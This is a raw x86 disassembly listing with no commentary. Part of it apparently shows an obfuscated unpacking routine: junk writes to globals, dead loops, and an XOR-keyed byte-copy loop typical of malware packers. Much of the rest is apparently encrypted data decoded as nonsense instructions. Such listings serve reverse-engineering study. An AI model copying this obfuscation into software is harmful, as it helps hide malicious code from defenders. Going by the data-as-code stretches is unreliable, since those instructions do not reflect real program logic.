  40f208:	scas   eax,DWORD PTR es:[edi]
  40f209:	outs   dx,DWORD PTR ds:[esi]
  40f20a:	(bad)  
  40f20b:	aad    0x5
  40f20d:	scas   al,BYTE PTR es:[edi]
  40f20e:	icebp  
  40f20f:	mov    esp,0x58a9c759
  40f214:	jl     0x40f20f
  40f216:	lea    ebx,[ebp+0x6e8099d7]
  40f21c:	lock pop edx
  40f21e:	test   DWORD PTR [edx],edx
  40f220:	enter  0x7ea9,0x7b
  40f224:	outs   dx,DWORD PTR ds:[esi]
  40f225:	inc    ecx
  40f226:	inc    edx
  40f227:	hlt    
  40f228:	mov    cl,0x59
  40f22a:	and    ebx,ecx
  40f22c:	push   edx
  40f22d:	ins    BYTE PTR es:[edi],dx
  40f22e:	call   0xe28a6e76
  40f233:	xchg   edx,eax
  40f234:	mov    BYTE PTR [ebx+0x6378ef0b],dl
  40f23a:	out    0xa,eax
  40f23c:	aad    0xe4
  40f23e:	bound  ecx,QWORD PTR [esi+eiz*4+0x1581576f]
  40f245:	xlat   BYTE PTR ds:[ebx]
  40f246:	test   DWORD PTR [edx+0x0],eax
  40f249:	scas   al,BYTE PTR es:[edi]
  40f24a:	jp     0x40f24c
  40f24c:	add    BYTE PTR [ebx-0x31fcef83],cl
  40f252:	mov    DWORD PTR ds:0x4285ff,0x246a
  40f25c:	cmp    ecx,edi
  40f25e:	mov    DWORD PTR ds:0x428627,0x3e93
  40f268:	je     0x40f379
  40f26e:	xor    edi,edi
  40f270:	mov    ecx,DWORD PTR [ebp-0x4]
  40f273:	not    edi
  40f275:	mov    edi,DWORD PTR [ebp+0x10]
  40f278:	sub    DWORD PTR ds:0x42863f,0x4adb
  40f282:	xor    eax,eax
  40f284:	adc    DWORD PTR ds:0x42865f,0x6085
  40f28e:	xor    ecx,edx
  40f290:	xor    DWORD PTR ds:0x42860b,0x42862f
  40f29a:	add    ecx,esi
  40f29c:	xor    DWORD PTR ds:0x4285d7,0x24ca
  40f2a6:	add    edi,0xfabdbedd
  40f2ac:	not    DWORD PTR ds:0x428617
  40f2b2:	adc    eax,0xffffffff
  40f2b5:	xor    eax,0x0
  40f2b8:	and    DWORD PTR ds:0x428663,0x428617
  40f2c2:	mov    DWORD PTR [ebp-0xc],eax
  40f2c5:	or     DWORD PTR ds:0x42866f,0x42864f
  40f2cf:	push   ebx
  40f2d0:	add    DWORD PTR ds:0x428647,ecx
  40f2d6:	xor    ebx,ebx
  40f2d8:	xor    edi,0x8a29a137
  40f2de:	mov    eax,ecx
  40f2e0:	add    eax,0xfabdbedd
  40f2e5:	adc    ebx,0xffffffff
  40f2e8:	xor    eax,0x8a29a137
  40f2ed:	xor    ebx,0x0
  40f2f0:	cmp    eax,edi
  40f2f2:	jne    0x40f30b
  40f2f8:	cmp    ebx,DWORD PTR [ebp-0xc]
  40f2fb:	je     0x40f373
  40f301:	jmp    0x40f30b
  40f306:	mov    esi,0x3272ec
  40f30b:	mov    eax,DWORD PTR [ebp-0x4]
  40f30e:	mov    edi,DWORD PTR [ebp-0x8]
  40f311:	xor    edi,edx
  40f313:	add    edi,esi
  40f315:	mov    esi,DWORD PTR [ebp+0x8]
  40f318:	imul   edi,ecx
  40f31b:	mov    ebx,DWORD PTR [ebp+0xc]
  40f31e:	xor    eax,edx
  40f320:	add    eax,ecx
  40f322:	mov    al,BYTE PTR [ebx+eax*1+0x3272ec]
  40f329:	mov    BYTE PTR [edi+esi*1],al
  40f32c:	mov    eax,DWORD PTR [ebp-0x8]
  40f32f:	mov    esi,DWORD PTR [ebp+0x10]
  40f332:	xor    eax,edx
  40f334:	xor    ebx,ebx
  40f336:	add    esi,0xfabdbedd
  40f33c:	adc    ebx,0xffffffff
  40f33f:	lea    ecx,[ecx+eax*1+0x3272ec]
  40f346:	xor    edi,edi
  40f348:	xor    esi,0x8a29a137
  40f34e:	xor    ebx,0x0
  40f351:	mov    eax,ecx
  40f353:	add    eax,0xfabdbedd
  40f358:	adc    edi,0xffffffff
  40f35b:	xor    eax,0x8a29a137
  40f360:	xor    edi,0x0
  40f363:	cmp    eax,esi
  40f365:	jne    0x40f306
  40f36b:	cmp    edi,ebx
  40f36d:	jne    0x40f306
  40f373:	mov    eax,0xf89c85b1
  40f378:	pop    ebx
  40f379:	pop    edi
  40f37a:	pop    esi
  40f37b:	leave  
  40f37c:	ret    0xc
  40f37f:	push   ebp
  40f380:	mov    ebp,esp
  40f382:	push   ecx
  40f383:	xor    DWORD PTR ds:0x428677,0x1e97
  40f38d:	mov    DWORD PTR [ebp-0x4],0xf89c85bc
  40f394:	dec    edx
  40f395:	mov    eax,DWORD PTR [ebp-0x4]
  40f398:	or     DWORD PTR ds:0x42862f,0x2902
  40f3a2:	mov    edx,DWORD PTR [ebp+0x10]
  40f3a5:	mov    ecx,0x75108a4
  40f3aa:	adc    DWORD PTR ds:0x428677,0x428657
  40f3b4:	xor    eax,ecx
  40f3b6:	add    eax,0x3272ec
  40f3bb:	or     DWORD PTR ds:0x42866b,0x4f38
  40f3c5:	mov    DWORD PTR [edx],eax
  40f3c7:	and    DWORD PTR ds:0x428603,0x0
  40f3d1:	jmp    0x40f3e1
  40f3d6:	mov    eax,ds:0x428603
  40f3db:	inc    eax
  40f3dc:	mov    ds:0x428603,eax
  40f3e1:	cmp    DWORD PTR ds:0x428603,0x17
  40f3e8:	jae    0x40f42d
  40f3ee:	cmp    DWORD PTR ds:0x428603,0x5
  40f3f5:	jge    0x40f42d
  40f3fb:	jmp    0x40f410
  40f400:	push   0x8c16
  40f405:	push   0x428617
  40f40a:	call   DWORD PTR ds:0x4287b3
  40f410:	cmp    DWORD PTR ds:0x428603,0x4
  40f417:	jne    0x40f428
  40f41d:	mov    eax,ds:0x428603
  40f422:	inc    eax
  40f423:	mov    ds:0x428603,eax
  40f428:	jmp    0x40f3d6
  40f42d:	mov    eax,DWORD PTR [ebp+0xc]
  40f430:	xor    eax,ecx
  40f432:	push   esi
  40f433:	mov    esi,DWORD PTR [ebp+0x10]
  40f436:	mov    edx,0x3272ec
  40f43b:	add    eax,edx
  40f43d:	mov    DWORD PTR [esi+0x4],eax
  40f440:	mov    eax,DWORD PTR [ebp+0x14]
  40f443:	mov    esi,DWORD PTR [ebp+0x10]
  40f446:	mov    DWORD PTR [esi+0x8],eax
  40f449:	mov    eax,DWORD PTR [ebp+0x18]
  40f44c:	mov    esi,DWORD PTR [ebp+0x10]
  40f44f:	mov    DWORD PTR [esi+0xc],eax
  40f452:	mov    eax,DWORD PTR [ebp+0x1c]
  40f455:	mov    esi,DWORD PTR [ebp+0x10]
  40f458:	mov    DWORD PTR [esi+0x10],eax
  40f45b:	mov    eax,DWORD PTR [ebp+0x8]
  40f45e:	xor    eax,ecx
  40f460:	add    eax,edx
  40f462:	pop    esi
  40f463:	leave  
  40f464:	ret    0x18
  40f467:	push   ebp
  40f468:	mov    ebp,esp
  40f46a:	sub    esp,0x9c
  40f470:	dec    ecx
  40f471:	mov    ecx,DWORD PTR [ebp+0x8]
  40f474:	mov    eax,0x8a94
  40f479:	sbb    DWORD PTR ds:0x428677,0x4285eb
  40f483:	xor    ax,WORD PTR [ecx+0x20]
  40f487:	mov    ecx,DWORD PTR ds:0x42864b
  40f48d:	sub    ecx,DWORD PTR ds:0x428673
  40f493:	mov    DWORD PTR ds:0x42864b,ecx
  40f499:	mov    ecx,0x3b56
  40f49e:	add    ax,cx
  40f4a1:	movzx  eax,ax
  40f4a4:	and    DWORD PTR ds:0x42865f,0x0
  40f4ae:	jmp    0x40f4c0
  40f4b3:	mov    ecx,DWORD PTR ds:0x42865f
  40f4b9:	inc    ecx
  40f4ba:	mov    DWORD PTR ds:0x42865f,ecx
  40f4c0:	cmp    DWORD PTR ds:0x42865f,0x11
  40f4c7:	jae    0x40f4ea
  40f4cd:	cmp    DWORD PTR ds:0x42865f,0x17
  40f4d4:	jge    0x40f4ea
  40f4da:	jmp    0x40f4e5
  40f4df:	call   DWORD PTR ds:0x4287b7
  40f4e5:	jmp    0x40f4b3
  40f4ea:	mov    DWORD PTR [ebp-0x10],eax
  40f4ed:	mov    BYTE PTR [ebp-0x1],0x7d
  40f4f1:	and    DWORD PTR ds:0x42863b,0x0
  40f4fb:	jmp    0x40f50d
  40f500:	mov    ecx,DWORD PTR ds:0x42863b
  40f506:	inc    ecx
  40f507:	mov    DWORD PTR ds:0x42863b,ecx
  40f50d:	cmp    DWORD PTR ds:0x42863b,0x11
  40f514:	jae    0x40f53a
  40f51a:	cmp    DWORD PTR ds:0x42863b,0x14
  40f521:	jg     0x40f53a
  40f527:	jmp    0x40f535
  40f52c:	push   DWORD PTR [ebp-0x1c]
  40f52f:	call   DWORD PTR ds:0x4287bb
  40f535:	jmp    0x40f500
  40f53a:	lea    eax,[ebp-0x1]
  40f53d:	xor    DWORD PTR ds:0x4285d7,0x262c
  40f547:	mov    DWORD PTR [ebp-0xc],eax
  40f54a:	inc    ecx
  40f54b:	mov    al,BYTE PTR [ebp-0x1]
  40f54e:	mov    ecx,DWORD PTR [ebp-0xc]
  40f551:	xor    al,0x79
  40f553:	sub    al,0x3
  40f555:	mov    BYTE PTR [ecx],al
  40f557:	mov    DWORD PTR [ebp-0x18],0xf89c85b0
  40f55e:	mov    eax,ds:0x428697
  40f563:	mov    ecx,DWORD PTR ds:0x4286db
  40f569:	sub    ecx,eax
  40f56b:	add    eax,DWORD PTR [eax+ecx*1]
  40f56e:	push   ebx
  40f56f:	and    DWORD PTR ds:0x428603,0x0
  40f579:	jmp    0x40f58c
  40f57e:	xor    eax,eax
  40f580:	add    eax,DWORD PTR ds:0x428603
  40f586:	inc    eax
  40f587:	mov    ds:0x428603,eax
  40f58c:	cmp    DWORD PTR ds:0x428603,0x10
  40f593:	jae    0x40f5e9
  40f599:	cmp    DWORD PTR ds:0x428603,0x7
  40f5a0:	jle    0x40f5e9
  40f5a6:	jmp    0x40f5c9
  40f5ab:	push   DWORD PTR [ebp-0x28]
  40f5ae:	push   0x428034
  40f5b3:	push   DWORD PTR [ebp-0x18]
  40f5b6:	push   0x428079
  40f5bb:	push   0x5a9e
  40f5c0:	push   DWORD PTR [ebp-0x14]
  40f5c3:	call   DWORD PTR ds:0x4287bf
  40f5c9:	cmp    DWORD PTR ds:0x428603,0x6
  40f5d0:	jne    0x40f5e4
  40f5d6:	xor    eax,eax
  40f5d8:	xor    eax,DWORD PTR ds:0x428603
  40f5de:	inc    eax
  40f5df:	mov    ds:0x428603,eax
  40f5e4:	jmp    0x40f57e
  40f5e9:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40f5f0:	sbb    DWORD PTR ds:0x42861b,ecx
  40f5f6:	mov    ecx,DWORD PTR [ebp-0x18]
  40f5f9:	push   esi
  40f5fa:	mov    eax,0x75108a4
  40f5ff:	xor    esi,esi
  40f601:	or     esi,DWORD PTR ds:0x42869f
  40f607:	mov    esi,DWORD PTR [esi]
  40f609:	or     DWORD PTR ds:0x428633,esi
  40f60f:	xor    ecx,eax
  40f611:	xor    DWORD PTR ds:0x428613,ebx
  40f617:	mov    esi,0x3272ec
  40f61c:	push   edi
  40f61d:	or     DWORD PTR ds:0x4285ef,0x42867b
  40f627:	add    ecx,esi
  40f629:	mov    DWORD PTR ds:0x42867b,0x3def
  40f633:	jmp    0x40f64d
  40f638:	mov    DWORD PTR ds:0x428633,0x70a7
  40f642:	mov    dl,BYTE PTR [ebp-0x1]
  40f645:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40f64c:	inc    ecx
  40f64d:	mov    DWORD PTR ds:0x4285ef,0x74bd
  40f657:	cmp    ecx,0x40
  40f65a:	mov    DWORD PTR ds:0x42865f,0x4046
  40f664:	jb     0x40f638
  40f66a:	adc    edx,0xe49
  40f670:	mov    edx,DWORD PTR [ebp-0x18]
  40f673:	xor    edx,eax
  40f675:	sub    DWORD PTR ds:0x4285d3,0x203c
  40f67f:	add    edx,esi
  40f681:	jmp    0x411adf
  40f686:	mov    edi,DWORD PTR [ebp+0x8]
  40f689:	jmp    0x411a2a
  40f68e:	sub    ah,al
  40f690:	xor    al,0xf6
  40f692:	test   al,0xa6
  40f694:	mov    al,ds:0x7e506298
  40f699:	mov    edx,edx
  40f69b:	push   ebp
  40f69c:	lds    ebp,FWORD PTR [edx+eax*2]
  40f69f:	mov    eax,ds:0x5ffe7a7a
  40f6a4:	jp     0x40f720
  40f6a6:	enter  0xf28d,0x6f
  40f6aa:	(bad)  
  40f6ab:	pop    ecx
  40f6ac:	adc    al,0x1a
  40f6ae:	xlat   BYTE PTR ds:[ebx]
  40f6af:	inc    edx
  40f6b0:	mov    ?,WORD PTR [edx]
  40f6b2:	imul   esi,DWORD PTR [ebx+0x7d],0xffffffc7
  40f6b6:	and    eax,0xcdd49722
  40f6bb:	pop    ebp
  40f6bc:	and    bh,BYTE PTR [edi]
  40f6be:	ficomp WORD PTR [edi+0x35]
  40f6c1:	call   0x1ba0ebbf
  40f6c6:	das    
  40f6c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6c8:	xor    bl,BYTE PTR [ecx-0x54]
  40f6cb:	(bad)  
  40f6cc:	not    edi
  40f6ce:	xor    ebp,edi
  40f6d0:	jae    0x40f68f
  40f6d2:	and    esi,DWORD PTR [edi-0x4c]
  40f6d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6d6:	popf   
  40f6d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6d8:	fisub  DWORD PTR [ebp-0x7f197473]
  40f6de:	sub    DWORD PTR [edx],0xffffffa3
  40f6e1:	xlat   BYTE PTR ds:[ebx]
  40f6e2:	push   ecx
  40f6e3:	test   DWORD PTR [edx],edi
  40f6e5:	dec    ecx
  40f6e6:	in     eax,dx
  40f6e7:	rol    BYTE PTR [ecx-0x70],0x97
  40f6eb:	xor    esp,ebx
  40f6ed:	push   ss
  40f6ee:	leave  
  40f6ef:	jmp    0x9af7:0xb41f9e24
  40f6f6:	aad    0xdf
  40f6f8:	sbb    ebx,DWORD PTR cs:[esi-0x52]
  40f6fc:	lahf   
  40f6fd:	test   DWORD PTR [ecx+0x37],0x119b8378
  40f704:	mov    fs,ebp
  40f706:	mov    edi,0xe24d681f
  40f70b:	adc    al,0x6c
  40f70d:	pop    edi
  40f70e:	fdivr  QWORD PTR [ebp+0x556c22c9]
  40f714:	cmp    al,0x4a
  40f716:	push   edi
  40f717:	aas    
  40f718:	adc    ecx,DWORD PTR [ecx+0x5b]
  40f71b:	aam    0xe5
  40f71d:	scas   eax,DWORD PTR es:[edi]
  40f71e:	sahf   
  40f71f:	lods   al,BYTE PTR ds:[esi]
  40f720:	xlat   BYTE PTR ds:[ebx]
  40f721:	add    al,0x3f
  40f723:	mov    al,0xa3
  40f725:	in     eax,0x28
  40f727:	mov    ds:0xe3db9abb,al
  40f72c:	adc    BYTE PTR [eax+0x3df86c7d],0xc2
  40f733:	stc    
  40f734:	mov    ds:0xd6ccacc5,al
  40f739:	scas   al,BYTE PTR es:[edi]
  40f73a:	or     BYTE PTR [edx+0x3],ah
  40f73d:	add    al,0xae
  40f73f:	jo     0x40f73a
  40f741:	sbb    BYTE PTR [ebx-0x32e5061e],ch
  40f747:	sbb    esp,ebp
  40f749:	cmp    eax,0xdb41d664
  40f74e:	sub    BYTE PTR [edi],0xe5
  40f751:	out    dx,eax
  40f752:	cmp    BYTE PTR [ebx],dh
  40f754:	lock sub eax,0x19b285c0
  40f75a:	(bad)  
  40f75b:	xor    ebx,edi
  40f75d:	popa   
  40f75e:	jmp    0x40f773
  40f760:	adc    DWORD PTR [esi-0x2b4d02d7],edi
  40f766:	jb     0x40f712
  40f768:	pop    ds
  40f769:	pop    esp
  40f76a:	push   es
  40f76b:	or     ecx,DWORD PTR [ecx-0x30560dcf]
  40f771:	mov    ds:0x26c567cb,al
  40f776:	cli    
  40f777:	call   0x839e1f07
  40f77c:	pop    eax
  40f77d:	inc    esi
  40f77e:	pop    ebx
  40f77f:	cpuid  
  40f781:	xor    DWORD PTR [eax-0x5916ef1c],ecx
  40f787:	cs jg  0x40f753
  40f78a:	jle    0x40f717
  40f78c:	shl    BYTE PTR [ebp+0x23],cl
  40f78f:	push   ebx
  40f790:	enter  0x2e53,0x97
  40f794:	push   ds
  40f795:	mov    al,ds:0x828d1ecc
  40f79a:	jp     0x40f732
  40f79c:	dec    edi
  40f79d:	pop    eax
  40f79e:	cmc    
  40f79f:	mov    edx,0x1fb1f663
  40f7a4:	rol    DWORD PTR [edi-0x1a3dba8a],cl
  40f7aa:	xchg   esp,eax
  40f7ab:	cld    
  40f7ac:	mov    ebp,0xa167adf5
  40f7b1:	xchg   esi,eax
  40f7b2:	xchg   BYTE PTR [edx],ch
  40f7b4:	ins    BYTE PTR es:[edi],dx
  40f7b5:	aad    0x34
  40f7b7:	lahf   
  40f7b8:	jle    0x40f7ba
  40f7ba:	xchg   ebx,eax
  40f7bb:	xor    eax,0xda73b6d
  40f7c0:	in     al,dx
  40f7c1:	cmp    DWORD PTR [eax+0x3f],ebx
  40f7c4:	xchg   ebx,eax
  40f7c5:	into   
  40f7c6:	pop    ebx
  40f7c7:	mov    ebp,DWORD PTR [edi-0x6fcd2b84]
  40f7cd:	xchg   BYTE PTR [esi+esi*1],cl
  40f7d0:	or     eax,0xab1d1cac
  40f7d5:	les    esp,FWORD PTR [edx+0x27]
  40f7d8:	test   BYTE PTR [edi-0x4f],ch
  40f7db:	out    0x93,eax
  40f7dd:	ds out 0x82,al
  40f7e0:	mov    ebp,0xa25148a9
  40f7e5:	fwait
  40f7e6:	rol    BYTE PTR [eax+edx*1],cl
  40f7e9:	jge    0x40f779
  40f7eb:	imul   esi,DWORD PTR [ebx+0x5],0xf85ece45
  40f7f2:	adc    al,0xe3
  40f7f4:	retf   
  40f7f5:	cmp    eax,0x2b874d01
  40f7fa:	jmp    0x53665fe9
  40f7ff:	push   edx
  40f800:	xchg   ebp,eax
  40f801:	iret   
  40f802:	inc    ecx
  40f803:	mov    ah,0x67
  40f805:	push   ds
  40f806:	fidivr WORD PTR [eax]
  40f808:	(bad)  
  40f809:	in     eax,dx
  40f80a:	imul   ebp,DWORD PTR [ecx-0x74828846],0xffffffb5
  40f811:	mov    al,ds:0x15a9a594
  40f816:	outs   dx,BYTE PTR ds:[esi]
  40f817:	in     al,0x84
  40f819:	retf   
  40f81a:	(bad)  
  40f81d:	sub    ch,al
  40f81f:	jmp    0x40f7a1
  40f821:	imul   ecx,DWORD PTR [eax],0x7c29b8e3
  40f827:	out    0xc9,eax
  40f829:	push   ebp
  40f82a:	cld    
  40f82b:	dec    edx
  40f82c:	pop    edi
  40f82d:	jno    0x40f7b9
  40f82f:	and    al,0x22
  40f831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f832:	jle    0x40f87e
  40f834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f835:	adc    DWORD PTR [ebx+0x5bf36223],ebx
  40f83b:	inc    edi
  40f83c:	jb     0x40f89b
  40f83e:	pop    ebp
  40f83f:	push   edi
  40f840:	sbb    DWORD PTR [ebx-0xbe2b71e],esp
  40f846:	jl     0x40f871
  40f848:	dec    esi
  40f849:	nop
  40f84a:	and    ebx,DWORD PTR [ebx+eax*1-0x469bafc6]
  40f851:	add    BYTE PTR [esi-0x465e43e9],0x2c
  40f858:	cdq    
  40f859:	mov    al,ds:0xf4c97bfb
  40f85e:	sub    BYTE PTR [ecx],ch
  40f860:	push   ecx
  40f861:	xor    edi,esi
  40f863:	gs sahf 
  40f865:	sub    BYTE PTR [edx+eiz*1-0x55fd1722],ch
  40f86c:	and    DWORD PTR [ebx-0x63df52ff],ebp
  40f872:	test   eax,0xe2e48520
  40f877:	or     cl,al
  40f879:	dec    esi
  40f87a:	in     al,dx
  40f87b:	lock in al,0x1
  40f87e:	sti    
  40f87f:	bound  edi,QWORD PTR [edi+esi*4]
  40f882:	adc    dl,BYTE PTR [ebp+0x78]
  40f885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f886:	mov    al,0x24
  40f888:	jns    0x40f8a2
  40f88a:	mov    al,ds:0x897fd10c
  40f88f:	data16 sahf 
  40f891:	mov    eax,0x4e6dd46
  40f896:	xchg   ebp,eax
  40f897:	call   0xa724:0x20813745
  40f89e:	pushf  
  40f89f:	(bad)  
  40f8a0:	adc    ebx,DWORD PTR [eax+0x3c]
  40f8a3:	scas   eax,DWORD PTR es:[edi]
  40f8a4:	lods   al,BYTE PTR ds:[esi]
  40f8a5:	stos   BYTE PTR es:[edi],al
  40f8a6:	stos   BYTE PTR es:[edi],al
  40f8a7:	jnp    0x40f8fd
  40f8a9:	sub    edi,ecx
  40f8ab:	sbb    edi,ebp
  40f8ad:	sub    DWORD PTR [esi+0x4035e05b],eax
  40f8b3:	and    ebp,DWORD PTR [ebp+eiz*8-0x33]
  40f8b7:	push   0xffffffe3
  40f8b9:	mov    WORD PTR [ebp-0x10053f71],ss
  40f8bf:	adc    BYTE PTR [edx],0xbb
  40f8c2:	test   ah,dh
  40f8c4:	sub    eax,DWORD PTR [esi]
  40f8c6:	fwait
  40f8c7:	lods   al,BYTE PTR ds:[esi]
  40f8c8:	jnp    0x40f8b9
  40f8ca:	or     edi,DWORD PTR [eax-0x66]
  40f8cd:	sar    BYTE PTR [eax-0x71],1
  40f8d0:	mov    ecx,0x9f9efb5
  40f8d5:	mov    ebx,ss
  40f8d7:	in     eax,0xa3
  40f8d9:	test   DWORD PTR [esi],0x87b693fb
  40f8df:	cmc    
  40f8e0:	jp     0x40f909
  40f8e2:	adc    ah,BYTE PTR [ebp+0xe0a965c]
  40f8e8:	fistp  WORD PTR [esi-0x1b]
  40f8eb:	lea    edx,[edx+eiz*8]
  40f8ee:	mov    bl,0xe9
  40f8f0:	mov    cl,0x1b
  40f8f2:	pop    edx
  40f8f3:	or     DWORD PTR ds:0x17e06cff,esp
  40f8fa:	clc    
  40f8fb:	xchg   BYTE PTR [edx+0x668ec18c],bh
  40f901:	dec    edx
  40f902:	pop    ecx
  40f903:	icebp  
  40f904:	imul   edi,DWORD PTR [ecx+0x64498d20],0x9898b4fe
  40f90e:	and    al,0xef
  40f910:	(bad)  
  40f912:	sti    
  40f913:	mov    edi,0x5d1ef131
  40f918:	sbb    eax,DWORD PTR [esi-0x51]
  40f91b:	cmp    cl,BYTE PTR [esi+edi*4+0x37]
  40f91f:	pop    ebp
  40f920:	add    dh,cl
  40f922:	jmp    0x9909:0x77e5cdfa
  40f929:	scas   eax,DWORD PTR es:[edi]
  40f92a:	fstp   QWORD PTR [eax]
  40f92c:	fdivrp st(4),st
  40f92e:	aas    
  40f92f:	ins    DWORD PTR es:[edi],dx
  40f930:	pop    esi
  40f931:	out    dx,eax
  40f932:	retf   0x77af
  40f935:	mov    es,WORD PTR [edi+0x0]
  40f938:	sbb    al,0x67
  40f93a:	popa   
  40f93b:	sub    dh,cl
  40f93d:	(bad)  
  40f93e:	jno    0x40f8e5
  40f940:	add    al,0x7c
  40f942:	into   
  40f943:	adc    esi,DWORD PTR [edx]
  40f945:	mov    ebp,0x48fbbef4
  40f94a:	mov    WORD PTR [edx],?
  40f94c:	test   al,0x75
  40f94e:	push   ecx
  40f94f:	loop   0x40f984
  40f951:	cmc    
  40f952:	add    edi,DWORD PTR [esi-0x1e]
  40f955:	fstp   st(7)
  40f957:	dec    esi
  40f958:	or     eax,0xb0b444c7
  40f95d:	dec    ebx
  40f95e:	pop    ebx
  40f95f:	jecxz  0x40f996
  40f961:	dec    edx
  40f962:	arpl   di,sp
  40f964:	sbb    ch,BYTE PTR [edi-0x4a06e0e3]
  40f96a:	jne    0x40f9d2
  40f96c:	lods   eax,DWORD PTR ds:[esi]
  40f96d:	aas    
  40f96e:	jle    0x40f8fa
  40f970:	or     ecx,ebx
  40f972:	dec    esp
  40f973:	mov    ds:0xbf80cae6,eax
  40f978:	and    al,dh
  40f97a:	mov    al,ds:0x2010071a
  40f97f:	jle    0x40f93d
  40f981:	in     al,dx
  40f982:	cli    
  40f983:	(bad)
  40f987:	inc    esi
  40f988:	jge    0x40f94f
  40f98a:	push   ebp
  40f98b:	stos   DWORD PTR es:[edi],eax
  40f98c:	rcr    edx,cl
  40f98e:	or     DWORD PTR [eax-0x75ed09de],edi
  40f994:	add    eax,0x64abde95
  40f999:	adc    BYTE PTR [eax+0x345dcd43],bl
  40f99f:	push   ebx
  40f9a0:	dec    ecx
  40f9a1:	test   eax,0xbc987ac5
  40f9a6:	add    eax,0xd06c70c0
  40f9ab:	fldenv [ebp-0x65]
  40f9ae:	popf   
  40f9af:	ror    DWORD PTR [eax+edx*1-0x6f7521fe],cl
  40f9b6:	aaa    
  40f9b7:	inc    esp
  40f9b8:	mov    ds:0x4a048d44,eax
  40f9bd:	jl     0x40f958
  40f9bf:	lahf   
  40f9c0:	lea    eax,[ecx+esi*1-0x463f5082]
  40f9c7:	aad    0x9
  40f9c9:	mov    ecx,0x54a1b4e2
  40f9ce:	inc    esi
  40f9cf:	imul   edx,DWORD PTR [esi+ecx*8+0x1a6e349c],0xffffffa8
  40f9d7:	lods   eax,DWORD PTR ds:[esi]
  40f9d8:	xchg   edi,eax
  40f9d9:	cdq    
  40f9da:	ret    
  40f9db:	mov    ebp,0xf351bb0a
  40f9e0:	(bad)  
  40f9e1:	push   ebp
  40f9e2:	xchg   ebp,eax
  40f9e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9e4:	stos   DWORD PTR es:[edi],eax
  40f9e5:	add    BYTE PTR [esi-0x6a01388b],bh
  40f9eb:	push   ebp
  40f9ec:	sub    BYTE PTR [ebx+0x68],dl
  40f9ef:	xchg   cl,ah
  40f9f1:	(bad)  
  40f9f2:	jbe    0x40fa29
  40f9f4:	leave  
  40f9f5:	bts    DWORD PTR [eax+0x5a],ecx
  40f9f9:	(bad)  
  40f9fa:	fcomp  QWORD PTR [edi+0x16350ae9]
  40fa00:	sub    esp,DWORD PTR [esi+0x564488b]
  40fa06:	ret    0x6af1
  40fa09:	push   ebp
  40fa0a:	cwde   
  40fa0b:	dec    esi
  40fa0c:	cwde   
  40fa0d:	fld    DWORD PTR [eax+0x61918e1e]
  40fa13:	pop    edx
  40fa14:	loopne 0x40fa0e
  40fa16:	jne    0x40fa60
  40fa18:	or     DWORD PTR [ebx+0x41],edi
  40fa1b:	pusha  
  40fa1c:	jg     0x40fa44
  40fa1e:	ins    BYTE PTR es:[edi],dx
  40fa1f:	test   bh,ch
  40fa21:	imul   ebx,ecx,0x6f
  40fa24:	inc    edi
  40fa25:	add    al,BYTE PTR ss:[eax]
  40fa28:	cmp    ecx,edx
  40fa2a:	shr    ebp,1
  40fa2c:	nop
  40fa2d:	jne    0x40fa4f
  40fa2f:	jecxz  0x40fa59
  40fa31:	sbb    al,0xf0
  40fa33:	add    edx,DWORD PTR [eax]
  40fa35:	aad    0x46
  40fa37:	jno    0x40fa2f
  40fa39:	rol    BYTE PTR [ebx-0x63191abd],1
  40fa3f:	dec    ecx
  40fa40:	add    BYTE PTR [esi+0x2e],dl
  40fa43:	not    eax
  40fa45:	fistp  WORD PTR [edi]
  40fa47:	lea    ebp,[edi+eax*8+0x22a2dd5d]
  40fa4e:	push   esi
  40fa4f:	outs   dx,BYTE PTR ds:[esi]
  40fa50:	lock pop edi
  40fa52:	inc    esi
  40fa53:	sar    BYTE PTR [edx-0x43b4bc68],1
  40fa59:	lock and eax,0x897b4f21
  40fa5f:	and    eax,DWORD PTR [edx+0x6a0a0b69]
  40fa65:	push   edx
  40fa66:	iret   
  40fa67:	dec    ebp
  40fa68:	fld    QWORD PTR [edi]
  40fa6a:	imul   BYTE PTR [ecx+eiz*4+0x481b86ab]
  40fa71:	aad    0x10
  40fa73:	mov    ebp,0x971d4347
  40fa78:	jno    0x40faeb
  40fa7a:	nop
  40fa7b:	jle    0x40fa42
  40fa7d:	test   eax,0xdcd73691
  40fa82:	aas    
  40fa83:	pop    ss
  40fa84:	and    DWORD PTR [edx],ebx
  40fa86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa87:	adc    edx,DWORD PTR [edi+0x27]
  40fa8a:	xchg   DWORD PTR [edx],edi
  40fa8c:	jg     0x40fb02
  40fa8e:	jbe    0x40fa4b
  40fa90:	cs push 0x40102d60
  40fa96:	mov    ch,0x6e
  40fa98:	pop    edi
  40fa99:	ficomp WORD PTR [ebx+0x3e]
  40fa9c:	rcl    ebx,1
  40fa9e:	arpl   WORD PTR [ecx+ebx*4-0x6777c38b],si
  40faa5:	dec    sp
  40faa7:	inc    ecx
  40faa8:	loop   0x40faa2
  40faaa:	repz inc ebp
  40faac:	jecxz  0x40fac8
  40faae:	frstor [ebp+0x176e9bd4]
  40fab4:	gs ret 0xd4b0
  40fab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fab9:	xchg   ecx,eax
  40faba:	shrd   DWORD PTR [eax],esp,0x6d
  40fabe:	aas    
  40fabf:	imul   edi,DWORD PTR [ebp-0x23c0cca2],0xd1ae7880
  40fac9:	jg     0x40faa5
  40facb:	inc    edx
  40facc:	inc    edi
  40facd:	and    ch,BYTE PTR [eax+0x15007d0f]
  40fad3:	pushf  
  40fad4:	cmp    edx,DWORD PTR [esp+ebp*2]
  40fad7:	xor    al,0x11
  40fad9:	push   esi
  40fada:	lahf   
  40fadb:	in     al,0x85
  40fadd:	or     ebp,DWORD PTR [ebp-0x68690b7b]
  40fae3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fae4:	inc    eax
  40fae5:	fisttp DWORD PTR [edx]
  40fae7:	mov    dl,0xff
  40fae9:	repz cmp ebp,DWORD PTR [ebp-0x2aeaf4bd]
